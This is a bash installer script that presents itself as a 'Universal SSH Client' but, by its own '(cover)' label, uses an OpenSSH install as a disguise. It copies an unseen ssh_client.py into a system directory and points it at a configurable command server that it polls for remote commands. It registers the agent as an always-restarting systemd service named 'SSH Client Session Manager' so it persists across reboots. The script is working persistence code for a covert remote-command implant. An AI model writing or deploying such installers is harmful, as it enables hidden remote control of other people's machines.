#!/bin/bash
# Universal SSH Client Installation Script - Works on any Linux system

echo "🥷 Installing SSH Client with Remote Command Capability..."
echo "=========================================================="

# Get current user and system info
CURRENT_USER=$(whoami)
CURRENT_HOME=$(eval echo ~$CURRENT_USER)
DISTRO=$(lsb_release -si 2>/dev/null || echo "Unknown")
PYTHON_VERSION=$(python3 -c "import sys; print(f'{sys.version_info.major}.{sys.version_info.minor}')" 2>/dev/null || echo "3.10")

echo "👤 Running as: $CURRENT_USER"
echo "🏠 Home directory: $CURRENT_HOME"
echo "🐧 Distribution: $DISTRO"
echo "🐍 Python version: $PYTHON_VERSION"

# Check if running as root
if [ "$EUID" -ne 0 ]; then
    echo "⚠️  This script should be run as root for system-wide installation"
    echo "💡 Try: sudo $0"
    echo "🔧 Or run as regular user for user-only installation"
    read -p "Continue as regular user? (y/n): " -n 1 -r
    echo
    if [[ ! $REPLY =~ ^[Yy]$ ]]; then
        exit 1
    fi
    USER_INSTALL=true
else
    USER_INSTALL=false
fi

# Detect package manager and install SSH
echo "📦 Installing OpenSSH client (cover)..."
if command -v apt &> /dev/null; then
    if [ "$USER_INSTALL" = false ]; then
        apt update -qq && apt install -y openssh-client python3-pip python3-venv
    else
        echo "⚠️  Cannot install system packages as regular user"
        echo "💡 Please install manually: sudo apt install openssh-client python3-pip python3-venv"
    fi
elif command -v yum &> /dev/null; then
    if [ "$USER_INSTALL" = false ]; then
        yum install -y openssh-clients python3-pip python3-venv
    else
        echo "⚠️  Cannot install system packages as regular user"
        echo "💡 Please install manually: sudo yum install openssh-clients python3-pip python3-venv"
    fi
elif command -v pacman &> /dev/null; then
    if [ "$USER_INSTALL" = false ]; then
        pacman -Sy --noconfirm openssh python-pip python-virtualenv
    else
        echo "⚠️  Cannot install system packages as regular user"
        echo "💡 Please install manually: sudo pacman -Sy openssh python-pip python-virtualenv"
    fi
else
    echo "⚠️  Unknown package manager. Please install SSH client manually."
fi

# Set installation directory
if [ "$USER_INSTALL" = true ]; then
    INSTALL_DIR="$CURRENT_HOME/.local/share/ssh-client"
    SERVICE_DIR="$CURRENT_HOME/.config/systemd/user"
    SERVICE_NAME="ssh-client.service"
    SYSTEMCTL_CMD="systemctl --user"
else
    INSTALL_DIR="/usr/share/ssh-client"
    SERVICE_DIR="/etc/systemd/system"
    SERVICE_NAME="ssh-client.service"
    SYSTEMCTL_CMD="systemctl"
fi

echo "📁 Installing to: $INSTALL_DIR"

# Create installation directory
mkdir -p "$INSTALL_DIR"
mkdir -p "$SERVICE_DIR"

# Copy client files
echo "📋 Copying client files..."
cp ssh_client.py "$INSTALL_DIR/ssh_client.py"
cp requirements.txt "$INSTALL_DIR/requirements.txt"

# Create virtual environment
echo "📦 Setting up Python environment..."
cd "$INSTALL_DIR"
python3 -m venv venv
if [ $? -eq 0 ]; then
    source venv/bin/activate
    pip install -r requirements.txt --quiet
    PYTHON_PATH="$INSTALL_DIR/venv/bin/python"
else
    echo "⚠️  Virtual environment failed, using system Python"
    pip3 install --user requests python-socketio
    PYTHON_PATH="python3"
fi

# Create configuration file
echo "⚙️  Creating configuration..."
cat > "$INSTALL_DIR/config.py" << EOF
# SSH Client Configuration
SERVER_URL = "http://localhost:5000"  # Change this to your server URL
HEARTBEAT_INTERVAL = 30
COMMAND_CHECK_INTERVAL = 5
AUTO_RECONNECT = True
DEBUG = False
EOF

# Update client script to use config
echo "🔧 Updating client script..."
cat > "$INSTALL_DIR/ssh_client_wrapper.py" << 'EOF'
#!/usr/bin/env python3
import sys
import os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

try:
    from config import *
except ImportError:
    print("Config file not found, using defaults")
    SERVER_URL = "http://localhost:5000"

# Update ssh_client.py with config values
import ssh_client
ssh_client.SERVER_URL = SERVER_URL
ssh_client.main()
EOF

# Create systemd service
echo "🔧 Creating system service..."
cat > "$SERVICE_DIR/$SERVICE_NAME" << EOF
[Unit]
Description=SSH Client Session Manager
After=network.target

[Service]
Type=simple
User=$CURRENT_USER
WorkingDirectory=$INSTALL_DIR
ExecStart=$PYTHON_PATH $INSTALL_DIR/ssh_client_wrapper.py
Restart=always
RestartSec=10
Environment=PYTHONPATH=$INSTALL_DIR

[Install]
WantedBy=default.target
EOF

# Enable and start service
echo "🚀 Installing and starting service..."
$SYSTEMCTL_CMD daemon-reload
$SYSTEMCTL_CMD enable $SERVICE_NAME
$SYSTEMCTL_CMD start $SERVICE_NAME

# Create management script
echo "🔧 Creating management script..."
cat > "$INSTALL_DIR/manage.sh" << EOF
#!/bin/bash
# SSH Client Manager

case "\$1" in
    start)
        echo "Starting SSH client..."
        $SYSTEMCTL_CMD start $SERVICE_NAME
        ;;
    stop)
        echo "Stopping SSH client..."
        $SYSTEMCTL_CMD stop $SERVICE_NAME
        ;;
    restart)
        echo "Restarting SSH client..."
        $SYSTEMCTL_CMD restart $SERVICE_NAME
        ;;
    status)
        $SYSTEMCTL_CMD status $SERVICE_NAME
        ;;
    logs)
        $SYSTEMCTL_CMD logs -f $SERVICE_NAME
        ;;
    config)
        echo "Editing configuration..."
        \${EDITOR:-nano} "$INSTALL_DIR/config.py"
        ;;
    uninstall)
        echo "Uninstalling SSH client..."
        $SYSTEMCTL_CMD stop $SERVICE_NAME
        $SYSTEMCTL_CMD disable $SERVICE_NAME
        rm -rf "$INSTALL_DIR"
        rm -f "$SERVICE_DIR/$SERVICE_NAME"
        $SYSTEMCTL_CMD daemon-reload
        echo "Uninstalled successfully"
        ;;
    *)
        echo "Usage: \$0 {start|stop|restart|status|logs|config|uninstall}"
        exit 1
        ;;
esac
EOF

chmod +x "$INSTALL_DIR/manage.sh"

# Create convenient symlink
if [ "$USER_INSTALL" = false ]; then
    ln -sf "$INSTALL_DIR/manage.sh" /usr/local/bin/ssh-client-manager
    echo "📍 Management script available at: ssh-client-manager"
else
    mkdir -p "$CURRENT_HOME/.local/bin"
    ln -sf "$INSTALL_DIR/manage.sh" "$CURRENT_HOME/.local/bin/ssh-client-manager"
    echo "📍 Management script available at: ~/.local/bin/ssh-client-manager"
    echo "💡 Add ~/.local/bin to your PATH if needed"
fi

echo ""
echo "✅ SSH Client Installation Complete!"
echo "================================================"
echo "📁 Installation directory: $INSTALL_DIR"
echo "⚙️  Configuration file: $INSTALL_DIR/config.py"
echo "🔧 Management script: $INSTALL_DIR/manage.sh"
echo ""
echo "📋 Quick Commands:"
echo "• Check status: $INSTALL_DIR/manage.sh status"
echo "• View logs: $INSTALL_DIR/manage.sh logs"
echo "• Edit config: $INSTALL_DIR/manage.sh config"
echo "• Restart: $INSTALL_DIR/manage.sh restart"
echo "• Uninstall: $INSTALL_DIR/manage.sh uninstall"
echo ""
echo "🌐 Don't forget to update SERVER_URL in config.py!"
echo "💡 Edit: $INSTALL_DIR/config.py"
EOF
